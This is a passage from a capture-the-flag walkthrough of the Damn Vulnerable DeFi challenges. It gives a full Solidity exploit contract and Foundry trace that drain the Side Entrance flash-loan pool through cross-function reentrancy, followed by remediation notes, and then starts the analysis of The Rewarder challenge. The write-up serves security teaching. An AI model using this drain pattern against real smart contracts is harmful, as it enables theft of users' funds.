</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Send stolen funds to the owner (attacker)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">payable</span>(<span style="color:#434f54">owner</span>).<span style="color:#434f54">sendValue</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The following sequence diagram shows our exploit scenario:</p>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;:&rsquo;neutral&rsquo;}}%%
sequenceDiagram
actor A as Attacker
participant E as Exploit
participant P as SideEntranceLenderPool</p>
<p>A-&raquo;E: new(pool)
activate E
A-&raquo;E: run()
E-&raquo;P: flashLoan(address(pool).balance)
activate P
Note right of E: take a flash loan of all the pool&rsquo;s funds
P-&raquo;E: execute()
Note right of E: the pool calls execute() sending all the Ether
E-&raquo;P: deposit(msg.value)
Note right of E: deposit all the borrowed funds
P-&raquo;P: balances[msg.sender] += msg.value
P&ndash;&raquo;E: ()
deactivate P
E-&raquo;P: withdraw()
Note right of E: immediately withdraw everything
P-&raquo;P: balances[msg.sender] = 0
P-&raquo;E: sendValue(&hellip;)
Note left of P: sendValue(&hellip;) calls the receive() function
P-&raquo;P: check address(this).balance &lt; balanceBefore
P&ndash;&raquo;E: ()
E-&raquo;A: sendValue(&hellip;)
Note right of A: withdraw stolen ETH
deactivate E</p>
 </div>
<p>The exploit:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Exploit</span> <span style="color:#728e00">is</span> <span style="color:#434f54">IFlashLoanEtherReceiver</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">using</span> <span style="color:#434f54">Address</span> <span style="color:#728e00">for</span> <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">SideEntranceLenderPool</span> <span style="color:#728e00">private</span> <span style="color:#434f54">pool</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">private</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">SideEntranceLenderPool</span> <span style="color:#434f54">_pool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_pool</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">execute</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">pool</span>), <span style="color:#7f8c8d">&#34;Sender is not a pool&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span>.<span style="color:#434f54">deposit</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#434f54">owner</span>, <span style="color:#7f8c8d">&#34;Not an owner&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">pool</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span>.<span style="color:#434f54">flashLoan</span>(<span style="color:#434f54">poolBalance</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">pool</span>.<span style="color:#434f54">withdraw</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>(<span style="color:#434f54">owner</span>).<span style="color:#434f54">sendValue</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Exploit</span> <span style="color:#434f54">expl</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">Exploit</span>(<span style="color:#434f54">sideEntranceLenderPool</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">expl</span>.<span style="color:#434f54">run</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The forge&rsquo;s trace reflects what we&rsquo;ve seen on the diagram above:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#728e00">[</span>304450<span style="color:#728e00">]</span> SideEntrance::testExploit<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>225707<span style="color:#728e00">]</span> → new Exploit@<span style="color:#7f8c8d">&#34;0x8ff7…c3ec&#34;</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#8a7b52">905</span> bytes of code
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>44491<span style="color:#728e00">]</span> Exploit::run<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   ├─ <span style="color:#728e00">[</span>37187<span style="color:#728e00">]</span> Side Entrance Lender Pool::flashLoan<span style="color:#728e00">(</span>1000000000000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>  │   │   ├─ <span style="color:#728e00">[</span>29848<span style="color:#728e00">]</span> Exploit::execute<span style="color:#728e00">{</span>value: 1000000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>  │   │   │   ├─ <span style="color:#728e00">[</span>22410<span style="color:#728e00">]</span> Side Entrance Lender Pool::deposit<span style="color:#728e00">{</span>value: 1000000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>  │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   ├─ <span style="color:#728e00">[</span>5971<span style="color:#728e00">]</span> Side Entrance Lender Pool::withdraw<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Exploit::fallback<span style="color:#728e00">{</span>value: 1000000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>  │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> Attacker::fallback<span style="color:#728e00">{</span>value: 1000000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>  │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>  └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Remediation</p>
<p>Use the <code>ReentrancyGuard</code> from OpenZeppelin to fix the
<a href="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/#cross-function-reentrancy"  class="external-link" target="_blank" rel="noopener">cross-function
reentrancy</a>.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/#cross-function-reentrancy"  class="external-link" target="_blank" rel="noopener">Cross-function
Reentrancy</a></li>
<li><a href="https://swcregistry.io/docs/SWC-107"  class="external-link" target="_blank" rel="noopener">SWC-107</a></li>
</ul>
<hr>
<p>Thanks for reading! The solution code is
<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/side-entrance/SideEntrance.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>Let&rsquo;s move on to the next challenge &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder" >#5
The rewarder</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #5 The rewarder</p>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
<p>Today we&rsquo;re going to take a look at <a href="https://www.damnvulnerabledefi.xyz/challenges/5.html"  class="external-link" target="_blank" rel="noopener">The Rewarder</a> challenge:</p>
 <div class="quote2">
<p>There&rsquo;s a pool offering rewards in tokens every 5 days for those
who deposit their DVT tokens into it. Alice, Bob, Charlie and
David have already deposited some DVT tokens, and have won their
rewards! You don&rsquo;t have any DVT tokens. But in the upcoming
round, you must claim most rewards for yourself. Oh, by the way,
rumours say a new pool has just landed on mainnet. Isn&rsquo;t it
offering DVT tokens in flash loans?</p>
 </div>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>Let&rsquo;s explore the smart contracts! For this challenge we have 5 of them:</p>
<ul>
<li><code>DamnValuableToken</code> &ndash; The ERC20 token deposited into <code>TheRewarderPool</code> by users
(DVT aka the &ldquo;liquidity token&rdquo;).</li>
<li><code>AccouningToken</code> &ndash; The ERC20 named <code>rToken</code> (rTKN). Used for internal
accounting and snapshots. Pegged \( 1:1 \) with the &ldquo;liquidity token&rdquo;
(DVT).</li>
<li><code>RewardToken</code> &ndash; The ERC20 token in which rewards are issued (RWT).</li>
<li><code>TheRewarderPool</code> &ndash; The pool offering rewards every \( 5 \) days.</li>
<li><code>FlashLoanerPool</code> &ndash; Another pool, which allows us to get a
flash loan in DVT. Has \( 1000000 \) (1 million) DVT&rsquo;s in it.</li>
</ul>
<p>Now, let&rsquo;s review the setup code in <code>TheRewarder.t.sol</code> test contract.</p>
 <!--list-separator-->
<ul>
<li>
<p>SetUp</p>
<p>There are 2 constants:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">internal</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">TOKENS_IN_LENDER_POOL</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">1</span><span style="color:#434f54">_000_000e18</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">internal</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">USER_DEPOSIT</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>;
</span></span></code></pre></div><p>The first one is used to set initial token balance of the pool
offering flash loans:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoanerPool</span>), <span style="color:#434f54">TOKENS_IN_LENDER_POOL</span>);
</span></span></code></pre></div><p>The second one is the amount of tokens each user deposits:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Each user gets 100 DVT&#39;s
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>], <span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Approve spending of 100 DVT and make a deposit
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">theRewarderPool</span>), <span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">deposit</span>(<span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Ensure that the pool&#39;s accounting token increased
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">assertEq</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">accToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]),
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">USER_DEPOSIT</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Initially there are \( 400 \) accounting tokens minted (\( 100 \) tokens
for each user) and no rewards distributed:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">accToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#434f54">USER_DEPOSIT</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">4</span>);
</span></span><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>Then it advances the time \( 5 \) days (the
minimum duration of round) so that depositors can get
rewards:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">vm</span>.<span style="color:#434f54">warp</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">5</span> <span style="color:#00979d">days</span>);
</span></span></code></pre></div><p>And calls the <code>distributeRewards()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">distributeRewards</span>(); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]), <span style="color:#8a7b52">25</span><span style="color:#434f54">e18</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>);
</span></span></code></pre></div><p>It asserts that:</p>
<ul>
<li>Each depositor gets \( 25 \) reward tokens (RWT).</li>
<li>The are \( 4 × 25 = 100 \) reward tokens (RWT) emitted.</li>
</ul>
<p>It also cheks that we start with zero DVT tokens in balance:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>), <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>And that the 2 rounds have occurred so far:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">roundNumber</span>(), <span style="color:#8a7b52">2</span>);
</span></span></code></pre></div><p>Next, let&rsquo;s go over the <code>validation()</code> function.</p>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>Validation</p>
<p>It asserts that only one round have taken place:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">roundNumber</span>(), <span style="color:#8a7b52">3</span>);
</span></span></code></pre></div><p>Then it ensures that users get negligible rewards this round:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">distributeRewards</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardPerUser</span> <span style="color:#728e00">=</span> <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">delta</span> <span style="color:#728e00">=</span> <span style="color:#434f54">rewardPerUser</span> <span style="color:#728e00">-</span> <span style="color:#8a7b52">25</span><span style="color:#434f54">e18</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertLt</span>(<span style="color:#434f54">delta</span>, <span style="color:#8a7b52">1</span><span style="color:#434f54">e16</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It calls the <code>distributeRewards()</code> for each user.</li>
<li>Calculates the current round reward (<code>delta</code>).</li>
<li>Asserts that it is less than \( 0.01 \) RWT.</li>
</ul>
<p>Finally, it checks that rewards have been issued:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertGt</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>);
</span></span></code></pre></div><p>And that the amount of rewards earned by attacker is really
close to \( 100 \) tokens:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardAttacker</span> <span style="color:#728e00">=</span> <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">deltaAttacker</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span> <span style="color:#728e00">-</span> <span style="color:#434f54">rewardAttacker</span>;
</span></span><span style="display:flex;"><span><span style="color:#434f54">assertLt</span>(<span style="color:#434f54">deltaAttacker</span>, <span style="color:#8a7b52">1</span><span style="color:#434f54">e17</span>);
</span></span></code></pre></div><p>The attacker finishes with zero DVT tokens in balance:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>), <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>Let&rsquo;s take a look at the challenge contracts.</p>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>AccountingToken</p>
<p>It inherits from the
<a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot"  class="external-link" target="_blank" rel="noopener">ERC20Snapshot</a>
and
<a href="https://docs.openzeppelin.com/contracts/3.x/api/access#AccessControl"  class="external-link" target="_blank" rel="noopener">AccessControl</a>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">AccountingToken</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ERC20Snapshot</span>, <span style="color:#434f54">AccessControl</span> { ... }
</span></span></code></pre></div><p>The <code>ERC20Snapshot</code> is an <code>ERC20</code> extension that lets you record
the total supply and balance of an account at the specific point
in time to retrieve later. The <code>AccessControl</code> contract allows
to implement role-based access control. <code>AccountingToken</code> uses
it to define 3 roles: minter, shapshot and burner:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">MINTER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;MINTER_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">SNAPSHOT_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;SNAPSHOT_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">BURNER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;BURNER_ROLE&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">constructor</span>() <span style="color:#434f54">ERC20</span>(<span style="color:#7f8c8d">&#34;rToken&#34;</span>, <span style="color:#7f8c8d">&#34;rTKN&#34;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">DEFAULT_ADMIN_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">SNAPSHOT_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">BURNER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It also has 3 corresponding external functions: <code>mint</code>,
<code>snapshot</code> and <code>burn</code>.</p>
<p>The <code>transfer</code> and <code>approve</code> functionality of ERC20 is
&ldquo;disabled&rdquo;:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_transfer</span>(<span style="color:#00979d">address</span>, <span style="color:#00979d">address</span>, <span style="color:#00979d">uint256</span>) <span style="color:#728e00">internal</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">revert</span> <span style="color:#434f54">NotImplemented</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_approve</span>(<span style="color:#00979d">address</span>, <span style="color:#00979d">address</span>, <span style="color:#00979d">uint256</span>) <span style="color:#728e00">internal</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">revert</span> <span style="color:#434f54">NotImplemented</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>RewardToken</p>
